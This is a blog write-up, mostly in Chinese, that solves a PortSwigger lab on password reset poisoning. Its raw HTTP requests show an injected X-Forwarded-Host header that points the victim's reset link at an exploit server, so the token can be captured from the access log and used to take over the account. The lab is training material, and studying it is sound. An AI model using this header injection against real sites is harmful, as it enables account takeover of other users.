[Write Up]Lab: Password reset poisoning via middleware

2024-12-04
#write-up  #portswigger  #authentication 

Lab description#

Solution#

  1. 进入Lab页面后，点击右上角My account按钮后进入login页面
  2. 首先使用wiener点击Forgot password?，在填写username后点击按钮，对应Request如下
    POST /forgot-password HTTP/2
Host: 0a5800510400298b80f5992500c700e3.web-security-academy.net

username=wiener
  3. 使用wiener:peter登录后通过上方Go to exploit server -> Email client进行Email，查看邮件
  4. 点击链接后跳转至重置密码页面，对应请求如下 
    POST /forgot-password?temp-forgot-password-token=paic89ucgyrg7c90iwdlm68mq1x6rz6z HTTP/2
Host: 0a5800510400298b80f5992500c700e3.web-security-academy.net

temp-forgot-password-token=paic89ucgyrg7c90iwdlm68mq1x6rz6z&new-password-1=1234&new-password-2=1234
  5. 将步骤2的Request发送到Burp Repeater，在请求中新增X-Forwarded-Host，指向Go to exploit server的URL，同时将username设置为carlos
    POST /forgot-password HTTP/2
Host: 0a5800510400298b80f5992500c700e3.web-security-academy.net
X-Forwarded-Host: exploit-0a520006049829088059982501f70055.exploit-server.net/exploit

username=carlos
  6. 通过Go to exploit server -> Access log查看X-Forwarded-Host所转发信息
  7. 访问https://0a5800510400298b80f5992500c700e3.web-security-academy.net/forgot-password?temp-forgot-password-token=550690ezc8yqhlyn0k881ch8xhz596mh
  8. 使用重置后的密码登录carlos
